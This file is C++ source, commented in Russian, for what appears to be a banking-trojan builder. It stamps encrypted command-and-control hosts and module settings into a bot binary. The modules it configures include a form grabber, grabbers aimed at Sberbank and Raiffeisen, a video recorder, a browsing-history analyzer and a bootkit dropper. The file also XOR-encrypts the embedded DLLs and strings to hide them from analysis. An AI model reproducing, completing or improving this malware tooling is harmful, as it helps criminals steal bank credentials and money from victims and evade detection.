//===========================================================================




//****************************************************************************
//                             TOldBotBuilder
//****************************************************************************

/*
__fastcall TOldBotBuilder::TOldBotBuilder(TComponent* AOwner)
	: TComponent(AOwner)
{
	FFile = new TMemoryStream();
	FParams = new TCollection(__classid(TOldBotParam));
	FModules = new TCollection(__classid(TOldBotModule));
	FActiveModules = new TList();


	// Добавляем основные параметры
	FPrefix    = new TOldBotParam(this, true, true, BOTPARAM_PREFIX, MAX_PREFIX_SIZE, ParamTitle_Prefix);
	FHosts     = new TOldBotParam(this, true, true, BOTPARAM_MAINHOSTS, MAX_MAINHOSTS_BUF_SIZE, ParamTitle_Hosts);
	FDelay     = new TOldBotParam(this, true, false, BOTPARAM_DELAY, MAX_DELAY_SIZE, ParamTitle_Delay);
	FPassword  = NULL;


	// Hunter
	TOldBotModule* Module = AddModule(Module_BankHosts);
	Module->AddParam(true, BOTPARAM_ENCRYPTED_BANKHOSTS, BOTPARAM_BANKHOSTS, MAX_BANKHOSTS_BUF_SIZE, ParamTitle_BankHosts);



}

__fastcall TOldBotBuilder::~TOldBotBuilder()
{
	delete FParams;
	delete FModules;
	delete FActiveModules;
	delete FFile;
}

// Функция загружает исходный файл
void __fastcall TOldBotBuilder::LoadSourceFile(const UnicodeString &FileName)
{
	FFile->Size = 0;
	FSourceFileName = "";


	TFileStream* S = new TFileStream(FileName, fmOpenRead);
	try {
		FFile->LoadFromStream(S);
		FFile->Position = 0;
	} __finally {
		delete S;
	}

}


//-----------------------------------------------------
// Build - Функция собирает сборку
//
// FullBuild  Параметр указывает, что собирается полная
//            сборка, при которой свойство параметров
//            Enabled будет игнорироваться
//-----------------------------------------------------
 bool __fastcall TOldBotBuilder::Build(bool FullBuild)
{
	if (FFile->Size == 0)
		throw Exception(Error_NoSourceFile);

    Message(Status_StartBuild);

	// Создаём случайый пароль шифрования строк
	PCHAR StrPass = Random::RandomString(MAX_SESSION_PASSW_SIZE - 1, 'a', 'z');
	FStringsPassword->AsAnsiString = StrPass;

	// Проверяем параметры
	Message(Status_CheckParams);

	TStringList* Errors = new TStringList();

	TBotParamStatus Status = CheckParamsValue(Errors, FullBuild);

	UnicodeString ErrorText = Errors->Text;
    delete Errors;

	if (Status == psOk)
		Message(Status_Ok);
	else
	{
		Message(Errors);

		if (Status == psError)
            throw Exception(ErrorText);
    }


	if (FResultFileName.IsEmpty())
		throw Exception(Error_UnknownResultFileName);

	// Записываем

	TMemoryStream *Mem = new TMemoryStream();
	try {

		// Дублируем файл
		FFile->Position = 0;
		Mem->LoadFromStream(FFile);

		Mem->Position = 0;
		FFile->Position = 0;

        Message(Status_WriteParams);

		// Записываем параметры
		DWORD Count   = FParams->Count;

		PCHAR Buf     = (PCHAR)Mem->Memory;
		DWORD BufSize = Mem->Size;


		// Шифруем данные DLL
		//EncryptDllData(Buf, BufSize, StrPass);

		// Шифруем строки бота
		//FStringsEncryptor->Encrypt(Buf, BufSize, StrPass);
		STR::Free(StrPass);

		// Записываем пароль для строк
		FStringsPassword->Write(Buf, BufSize);

		// Вшиваем параметры
		for (int i = 0; i < Count; i++)
		{
			TOldBotParam* Param = (TOldBotParam*)FParams->Items[i];

			if (Param->Active)
			{
				if ((FullBuild || Param->Enabled))
					WriteParametr(Buf, BufSize, Param);
				else
				{
					// Параметр отключен, забиваем его место нулями
					if (Param->Enabled)
						Param->WriteEmptyData(Buf, BufSize);
                }
			}
		}


		// Сохраняем файл
		Message(Status_SaveFile + FResultFileName);
		TFileStream *File = new TFileStream(FResultFileName, fmCreate);
		try {

			File->Write(Mem->Memory, Mem->Size);

		} __finally{
			delete File;
		}


	} __finally {
		delete Mem;
	}

	Message("");
    Message(Status_BuildCompleted);

	return true;
}
//-----------------------------------------------------------------

// Функция записывает данные в буфер
void __fastcall TOldBotBuilder::WriteParametr(PCHAR Buf, DWORD BufSize, TOldBotParam* Param)
{
    Message(Status_WriteParam + Param->DisplayName);
	bool Result = Param->Write(Buf, BufSize);
	if (Result)
		Message(Status_Ok);
	else
		Message(Status_Error);
}



// Функция вызывается после изменения значения параметра
void __fastcall TOldBotBuilder::ParamValueChanged(TOldBotParam* Sender)
{
	if (Sender == FPrefix)
	{
		// Сменился префикс, меняем имя результирующего файла
    }
}



void __fastcall TOldBotBuilder::ClearParams()
{
	// Функция очищает данные параметров
	for (int i = 0; i < FParams->Count; i++)
		((TOldBotParam*)FParams->Items[i])->Clear();
}


void __fastcall TOldBotBuilder::Message(const UnicodeString &Message)
{
	if (FOnMessage)
		FOnMessage(this, Message);
}


void __fastcall TOldBotBuilder::Message(TStrings *Messages)
{
	int Count = Messages->Count;
	for (DWORD i = 0; i < Count; i++)
		Message(Messages->Strings[i]);
}


TOldBotModule* __fastcall TOldBotBuilder::AddModule(const char *Name)
{
	return new TOldBotModule(this, Name);
}



//----------------------------------------------------------------------------

void __fastcall TOldBotBuilder::EncryptDllData(PCHAR Buf, DWORD BufSize, PCHAR Passw)
{
	// Функция шифрует данные библиотек
	while (true)
	{
		// Определяем позицию DLL в буфере
		int Pos = STR::Pos(Buf, ENCRYPTED_DLL_MARKER, BufSize, true);
		if (Pos < 0)
			break;

		// Запоминаем начало маркера
        PCHAR MarkerPtr = Buf + Pos;

		// Переходим к длл
		Buf     += Pos + ENCRYPTED_DLL_MARKER_SIZE;
		BufSize -= Pos + ENCRYPTED_DLL_MARKER_SIZE;

		// Определяем размер данных
		DWORD DllSize = *(PDWORD)Buf;

		// Пропускаем данные о размере
		Buf     += sizeof(DWORD);
		BufSize -= sizeof(DWORD);

		if (DllSize > BufSize)
			throw Exception("Нарушение целостности встроенных DLL!\r\nОбратитесь к разработчикам!");

		// Шифруем данные
		XORCrypt::Crypt(Passw, (LPBYTE)Buf, DllSize);

		// Прячем маркер
		XORCrypt::Crypt(Passw, (LPBYTE)MarkerPtr, ENCRYPTED_DLL_MARKER_SIZE);

		// Пропускаем длл
		Buf     += DllSize;
		BufSize -= DllSize;
	}
}
//----------------------------------------------------------------------------


//-----------------------------------------------------------------------------
//                  Инициализация модулей бота
//-----------------------------------------------------------------------------


void __fastcall TOldBotBuilder::InitializeModules()
{
	TOldBotModule* Module;


    // Hunter
	Module = AddModule(Module_Hunter);
	Module->AddParam(false, HUNTER_PARAM_ENCRYPTED, HUNTER_PARAM_NAME, HUNTER_PARAM_SIZE, "Ссылки модуля Hunter");

    // Настройки формграбера
	Module = AddModule(Module_FormGraber);
	Module->AddParam(false, FGRFILTER_PARAM_ENCRYPTED_URLS, FGRFILTER_PARAM_NAME_URLS, FGRFILTER_PARAM_SIZE_URLS, "Ссылки формграбера");
	Module->AddParam(false, FGRFILTER_PARAM_ENCRYPTED_DATAMASK, FGRFILTER_PARAM_NAME_DATAMASK, FGRFILTER_PARAM_SIZE_DATAMASK, "Маски пост данных");



	// Видеорекордер
	Module = AddModule(Module_VideoRecorder);
	Module->AddParam(true,  VIDEOREC_PARAM_ENCRYPTED_HOST, VIDEOREC_PARAM_NAME_HOST1, VIDEOREC_PARAM_SIZE_HOST, "Сервер записи видео №1");
	Module->AddParam(false, VIDEOREC_PARAM_ENCRYPTED_HOST, VIDEOREC_PARAM_NAME_HOST2, VIDEOREC_PARAM_SIZE_HOST, "Сервер записи видео №2");
	Module->AddParam(false, VIDEOREC_PARAM_ENCRYPTED_URLS, VIDEOREC_PARAM_NAME_URLS,  VIDEOREC_PARAM_SIZE_URLS, "Адреса старта записиси видео");

	// JAVA Config
	Module = AddModule(Module_JavaConfig);
	Module->AddParam(true, JAVA_PARAM_ENCRYPTED, JAVA_PARAM_NAME, JAVA_PARAM_SIZE, "Ссылки JAVA");

	// Ссылки AZ
	Module = AddModule(Module_AzConfig);
//	Module->AddParam(false, AZCONFIG_PARAM_ENCRYPTED_HOSTS, AZCONFIG_PARAM_NAME_HOSTS, AZCONFIG_PARAM_SIZE_HOSTS, "Хосты системы AZ");
//	Module->AddParam(true, AZCONFIG_PARAM_ENCRYPTED_SCRIPTHOSTS, AZCONFIG_PARAM_NAME_SCRIPTHOSTS, AZCONFIG_PARAM_SIZE_SCRIPTHOSTS, "Хосты Java скриптов системы AZ");
	Module->AddParam(true, AZCONFIG_PARAM_ENCRYPTED_AZUSER, AZCONFIG_PARAM_NAME_AZUSER, AZCONFIG_PARAM_SIZE_AZUSER, "Имя пользователя AZ");



	// Настройки грабера сбер
	Module = AddModule(Module_SberHosts);
	Module->AddParam(true, SBERHOSTS_PARAM_ENCRYPTED, SBERHOSTS_PARAM_NAME, SBERHOSTS_PARAM_SIZE, "Хосты грабера SBER");

    // Настройки параметров рафы
	Module = AddModule(Module_RafaHosts);
	Module->AddParam(true, RAFAHOSTS_PARAM_ENCRYPTED, RAFAHOSTS_PARAM_NAME, RAFAHOSTS_PARAM_SIZE, "Хосты грабера RAFA");

	// Настройки системы CC
	Module = AddModule(Module_CCHosts);
	Module->AddParam(true, ССHOSTS_PARAM_ENCRYPTED, CCHOSTS_PARAM_NAME, CCHOSTS_PARAM_SIZE, "Хосты грабера CC");

	// Настройки анализатора истории навигации
	Module = AddModule(Module_HistoryAnalyzer);
	Module->AddParam(true, BOTPARAM_ENCRYPTED_HISANALIZERLINKS, BOTPARAM_HISANALIZERLINKS, BOTPARAM_SIZE_HISANALIZERLINKS, "Ссылки анализатора истории навигации");



	// Настройки дропера буткита
	Module = AddModule(Module_BootkitDroper);
	Module->AddParam(true, false, Param_DroperNamePrefix, 0, "Превикс дропера буткита");
	Module->AddParam(true, false, Param_TargetPlatform,   0, "Платформа назначения дропера буткита");
	TOldBotParam* P = Module->AddParam(true, false, Param_SVCFuckupEnabled, 0, "Использовать SVC подмену дропером буткита");
	P->AsAnsiString = "0";
}

*/


//****************************************************************************
//                             TOldBotParam
//****************************************************************************
/*
__fastcall TOldBotParam::TOldBotParam(TOldBotBuilder* AOwner, bool NotNull, bool Encrypted,
	const char* Name, DWORD Size, const char* Title)
	: TCollectionItem((AOwner) ? AOwner->FParams : NULL)
{
	if (STRA::IsEmpty(Name))
		throw Exception("Unknown param name!");

	if (Size == 0)
		Size = STRA::Length(Name);

	FEnabled = true;
	FEncrypted = Encrypted;
	FOwner = AOwner;
	FTitle = Title;
	FName = Name;
	FNotNull = NotNull;
	// Так как большинство параметров являются строковыми, то
	// размер буфера устанавливаем с учётом завершающего нуля
	FSize = Size - 1;
	FDataSize = 0;
	FData = (PCHAR)malloc(FSize + 1);
	if (!FData)
		throw Exception(Error_MemAlloc);

    Clear();
}
//-----------------------------------------------------------------------------


__fastcall TOldBotParam::~TOldBotParam()
{
	free(FData);
	if (FModule)
		FModule->FParams->Remove(this);
}
//-----------------------------------------------------------------------------

void __fastcall TOldBotParam::SetSize(DWORD Value)
{
	FSize = Value;
}
//-----------------------------------------------------------------------------

bool __fastcall TOldBotParam::GetActive()
{
	return FModule == NULL || FModule->Active;
}
//-----------------------------------------------------------------------------


// Функция возвращает отображаемое имя параметра
UnicodeString __fastcall TOldBotParam::GetDisplayName(void)
{
	if (FTitle.IsEmpty())
		return FName;
	else
		return FTitle;
}
//-----------------------------------------------------------------------------

// Функция возвращает истину если параметр пустой
bool __fastcall TOldBotParam::IsEmpty()
{
	return FDataSize == 0;
}
//-----------------------------------------------------------------------------

// Функция очищает параметр
void __fastcall TOldBotParam::Clear()
{
	FDataSize = 0;
	m_memset(FData, 0, FSize + 1);
}
//-----------------------------------------------------------------------------


// Функция устанавливает значение параметра
void __fastcall TOldBotParam::SetValue(PCHAR Value, DWORD ValueSize)
{
	Clear();

	if (Value && !ValueSize)
		ValueSize = STRA::Length(Value);

	if (ValueSize > FSize)
		throw Exception(Error_DataSizeError);

	if (Value && ValueSize)
	{
		m_memcpy(FData, Value, ValueSize);
		FDataSize = ValueSize;
		if (FEncrypted)
            DecryptStr(FData, FData);
	}

	Changed();
}
//-----------------------------------------------------------------------------


void __fastcall TOldBotParam::DoChanged()
{

}
//-----------------------------------------------------------------------------

void __fastcall TOldBotParam::Changed()
{
	DoChanged();
	if (FOwner)
		FOwner->ParamValueChanged(this);
}
//-----------------------------------------------------------------------------


AnsiString __fastcall TOldBotParam::GetAsAnsiString()
{
	AnsiString S = FData;
	if (FEncrypted)
		DecryptStr(S.c_str(), S.c_str());
	return S;
}
//-----------------------------------------------------------------------------

void __fastcall TOldBotParam::SetAsAnsiString(const AnsiString &Value)
{
    SetValue(Value.c_str(), Value.Length());
}
//-----------------------------------------------------------------------------


UnicodeString __fastcall TOldBotParam::GetAsUnicodeString()
{
	return AsAnsiString;
}
//-----------------------------------------------------------------------------

void __fastcall TOldBotParam::SetAsUnicodeString(const UnicodeString &Value)
{
	AsAnsiString = Value;
}
//-----------------------------------------------------------------------------



UnicodeString __fastcall TOldBotParam::GetAsStrings()
{
	// Функция возвращает многострочный текст
	if (FDataSize == 0)
		return "";

	TStringList *S = new TStringList();

	SaveToStrings(S);

	UnicodeString R = S->Text;
	delete S;
	return R;

}
//-----------------------------------------------------------------------------

void __fastcall TOldBotParam::SetAsStrings(const UnicodeString &Value)
{
	if (Value.Length() == 0)
	{
		Clear();
		return;
	}

	TStringList *S = new TStringList();
	S->Text = Value;

	LoadFromStrings(S);

	delete S;
}
//-----------------------------------------------------------------------------

void __fastcall TOldBotParam::SaveToStrings(TStrings *Strings)
{
	// Функция созраняет данные в набор строк,
	// Подразумевается, что данные это набор строк разделённых нулём
	Strings->Clear();
	Strings->BeginUpdate();
	try {


		if (FDataSize)
		{
			TStrEnum E(FData, FEncrypted, 0);
			while (E.Next())
			{
				Strings->Add(E.Line().t_str());
			}
		}

	} __finally {
		Strings->EndUpdate();
	}

}
//-----------------------------------------------------------------------------

void __fastcall TOldBotParam::LoadFromStrings(TStrings *Strings)
{
	// Функция данные данные из набора строк,
	// Подразумевается, что данные это набор строк разделённых нулём
	Clear();

	int Count = Strings->Count;

    PCHAR Buf = FData;

	for (int i = 0; i < Count; i++)
	{
		AnsiString S = Strings->Strings[i].Trim();
		DWORD Len = S.Length();
		if (Len == 0) continue;

		Len++;// Цепляем ноль в конце

		// Проверяем помещается ли наша строка
		if (FDataSize + Len >= FSize)
			return;

		// При необходимости шифруем строку
		if (FEncrypted)
			DecryptStr(S.c_str(), S.c_str());

		// Копируем данные
		m_memcpy(Buf, S.c_str(), Len);

		Buf += Len;
		FDataSize += Len;
	}
}
//-----------------------------------------------------------------------------

bool __fastcall TOldBotParam::Write(PCHAR Buf, DWORD BufSize)
{
	// Функция записывает своё значение в буфер
	return DoWrite(Buf, BufSize, FData, FSize);
}
//-----------------------------------------------------------------------------

bool __fastcall TOldBotParam::WriteEmptyData(PCHAR Buf, DWORD BufSize)
{
	// Функция заполняет нулями своё место в сборке
	int Pos = Position(Buf, BufSize);
	if (Pos < 0) return false;

	m_memset(Buf + Pos, 0, FSize + 1);
	return true;
}
//-----------------------------------------------------------------------------


int  __fastcall TOldBotParam::Position(PCHAR Buf, DWORD BufSize)
{
	// Функция возвращает позицию параметра в буфере
	return STR::Pos(Buf, FName.c_str(), BufSize);
}
//-----------------------------------------------------------------------------


bool __fastcall TOldBotParam::DoWrite(PCHAR Buf, DWORD BufSize, PCHAR AData, DWORD ADataSize)
{
	// Ищем позицию
	int Pos = Position(Buf, BufSize);
	if (Pos < 0) return false;
	if (ADataSize > FSize)
		throw Exception(Error_DataSizeError);

	// записываем данные
	PCHAR Param = Buf + Pos;
	m_memset(Param, 0, FSize + 1);
	m_memcpy(Param, AData, ADataSize);
	return true;
}
//-----------------------------------------------------------------------------


*/

//*************************************************************
//  TCustomBotDataEncryptor  - Базовый Класс шифрования
//							   данных бота
//*************************************************************
TCustomBotDataEncryptor::TCustomBotDataEncryptor(TCustomBotModule* AOwner, PCHAR Name, DWORD Size)
	: TBotParam(AOwner, Name, Size, false, false, NULL)
{
    IsDynamic = true;
}



//*****************************************************************************
//   						TBotStringsCryptor
//*****************************************************************************
__fastcall TBotStringsEncryptor::TBotStringsEncryptor(TCustomBotModule* AOwner)
	: TCustomBotDataEncryptor(AOwner, "STRINGS_ENCRYPTOR", 0)
{

}
//---------------------------------------------------------------------------

//--------------------------------------------------
//  Функция сохраняет значения параметров в поток
//--------------------------------------------------
bool TBotStringsEncryptor::UpdateStatus(LPBYTE Buf, DWORD BufSize)
{
	// Находим начало блока шифрованных строк
	if (!Enabled)
	{
		FPosition = -1;
		return false;

    }
	PCHAR StartAnchor = ENCRYPTED_STRINGS_BEGIN;
	PCHAR EndAnchor   = ENCRYPTED_STRINGS_END;

	// Определяем позиции блока шифрованных строк
	FPosition = STR::Pos(Buf, StartAnchor, BufSize, true);

	if (FPosition < 0) return false;


	// Определяем конец блока
	int End = STR::Pos(Buf + FPosition, EndAnchor, BufSize - FPosition, true);
	if (End < 0)
		throw Exception("Нарушение целостности блока шифрованных строк! \r\nОбратитесь к разработчикам.");

	FEndAnchorPos = FPosition + End;


	// Проверяем данные. Цель проверки не допустить повреждения целосности
	// бота. Считаем, что строки не могут содержать символы с кодом менее 9.

	for (int i = FPosition; i < FEndAnchorPos; i++)
	{
		if (Buf[i] > 0 && Buf[i] < 9)
			throw Exception("Нарушение целостности блока шифрованных строк! \r\nОбратитесь к разработчикам.");

	}

	// Расчитываем размер блока
	FSize = (FEndAnchorPos - FPosition) + STRA::Length(EndAnchor) + 1;

	return true;
}

//--------------------------------------------------
//  Функция шифрует строки
//--------------------------------------------------
bool TBotStringsEncryptor::Write(LPBYTE Buf, DWORD BufSize)
{
	if (FPosition < 0) return false;

    AnsiString Pass = Password->AsString;

	PCHAR StartAnchor = (PCHAR)(Buf + FPosition);
	PCHAR EndAnchor   = (PCHAR)(Buf + FEndAnchorPos);
	PCHAR Line = StartAnchor + STRA::Length(StartAnchor) + 1;

	while (Line < EndAnchor)
	{
		// Пропускаем лишние нули
		if (*Line == 0)
		{
			Line++;
			continue;
		}

		string OldString = Line;

		DWORD Len = STRA::Length(Line);
		if (Len > 255)
			throw Exception("Размер кодируемой строки превышает допустимые нормы!");

		// Шифруем данные
		// Шифруем XOR ключём. Нюанс в том, что мы сместим сроку на один байт
		// и первым байтом запишем размер исходной строки
		string Tmp = XORCrypt::EncodeString(Pass.c_str(), Line);

		// Записываем шифрованную строку
		m_memcpy(Line, Tmp.t_str(), Len + 1);

		// Проверяем правильность шифрования
		string DecodedStr = XORCrypt::DecodeString(Pass.c_str(), Line);
		if (OldString != DecodedStr)
			throw Exception("Во время шифрования строк прооизошла ошибка");

		// Переходим к следующей строке
		Line += Len + 1;
    }


	// Удяляем информацию о маркерах
	m_memset(StartAnchor, 0, STRA::Length(StartAnchor));
	m_memset(EndAnchor,   0, STRA::Length(EndAnchor));

	return true;
}
//---------------------------------------------------------------------------


//*************************************************************
//   TBotDLLEncryptor  - Класс шифрования интегрированных
//                       DLL бота
//*************************************************************
TBotDLLEncryptor::TBotDLLEncryptor(TCustomBotModule* AOwner, int APosition, DWORD ASize)
	: TCustomBotDataEncryptor(AOwner, "DLL_ENCRYPTOR", ASize)
{
	FPosition = APosition;
	IsSessional = true;
	FDllSize = 0;
	FPassword = Random::RandomString2(ENCRYPTED_DLL_MARKER_SIZE - 1, 10, 255);
}

//--------------------------------------------------
//  Функция зашифровывает данные длл
//--------------------------------------------------
bool TBotDLLEncryptor::Write(LPBYTE Buf, DWORD BufSize)
{

	PCHAR Ptr = Buf + Position;
	PCHAR Marker = Ptr;

	// Проверяем маркер
	DWORD Hash = STRA::Hash(Ptr, ENCRYPTED_DLL_MARKER_SIZE, false);

	if (Hash != ENCRYPTED_DLL_MARKER_HASH)
		throw Exception("Во время шифрования интегрированных dll возникла ошибка!");

	// Получаем размер длл
	Ptr += ENCRYPTED_DLL_MARKER_SIZE;
	FDllSize = *(PDWORD)Ptr;
	Ptr += sizeof(DWORD);

	// Для дальнешего контроля получаем хэш
	FHash = STRA::Hash(Ptr, FDllSize, false);
	// Шифруем данные
	PCHAR P = FPassword.t_str();
	XORCrypt::Crypt(P, (LPBYTE)Ptr, FDllSize);

	// Записываем пароль на место маркера
	m_memcpy(Marker, FPassword.t_str(), FPassword.Length() + 1);

	return true;
}

//--------------------------------------------------
//  Проверяем корректность шифрования длл
//--------------------------------------------------
bool TBotDLLEncryptor::CheckParam(LPBYTE Buf, LPBYTE OriginalBuf)
{
	if (FPosition < 0 || FDllSize == 0)
		return false;

	// Расшифровываем библиотеку
	DWORD Size = 0;
	LPVOID DllBuf = NULL;
	bool BufAllocated = false;
	if (!TMemoryDLL::DecodeDll(Buf + Position, Size, DllBuf, BufAllocated))
		return false;

	// Сравниваем размеры
	bool Result = FDllSize == Size;

	// Сравниваем содержимое
	if (Result)
	{
		DWORD NewHash = STRA::Hash((PCHAR)DllBuf, FDllSize, false);
		Result = NewHash == FHash;
    }

	if (BufAllocated)
		MemFree(DllBuf);
    return Result;
}








//*************************************************************
//   TBuildChecker  - Класс проверки результата сборки
//*************************************************************
__fastcall  TBuildChecker::TBuildChecker(TComponent* AOwner, TBaseBotModule* AModule)
	: TComponent(AOwner)
{
	FModule = AModule;
	if (FModule)
		OpenFiles(AModule->FileName, AModule->ResultFileName);

}

__fastcall  TBuildChecker::~TBuildChecker()
{
	MemFree(FSourceBuf);
	MemFree(FResultBuf);
}


//--------------------------------------------------
//  Функция открывает файлы для сравнения
//--------------------------------------------------
bool TBuildChecker::OpenFiles(const UnicodeString& SourceFile, const UnicodeString& ResultFile)
{
	FSourceFile = SourceFile;
	FResultFile = ResultFile;

	FSourceSize = 0;
	FResultSize = 0;
	FSourceBuf = File::ReadToBufferW(FSourceFile.w_str(), FSourceSize);
	FResultBuf = File::ReadToBufferW(FResultFile.w_str(), FResultSize);
}

//--------------------------------------------------
//  Функция сравнивает два буфера
//--------------------------------------------------
bool TBuildChecker::CompareBuffers(LPBYTE Source, DWORD SourceSize, LPBYTE Result, DWORD ResultSize)
{
	if (!FModule || !Source || !Result || !SourceSize || !ResultSize)
		return false;

	if (SourceSize != ResultSize)
		return false;

	DWORD Pos = 0;
	while (Pos < SourceSize)
	{
		if (Source[Pos] == Result[Pos])
		{
			Pos++;
			continue;
		}

		// Нашли отличие в буферах
		TBotParam* Param = FModule->GetParamForPos(Pos);
		if (!Param)
		{
			// Наёден байт который не относится к найденной позиции
			return false;
		}

		// Проверяем валидность параметра
		if (!Param->CheckParam(Result, Source))
		{
//			UnicodeString FileName = "c:\\Test\\Params\\";
//			FileName += Param->Name + ".log";
//			File::WriteBufferW(FileName.w_str(), &Result[Pos], Param->Size);
			return false;
		}


		// Переходим к концу параметра
		Pos +=  Param->Size;
	}
    return true;
}

//--------------------------------------------------
//  Функция проверяет сборку
//--------------------------------------------------
bool TBuildChecker::Check()
{
	return CompareBuffers(FSourceBuf, FSourceSize, FResultBuf, FResultSize);
}
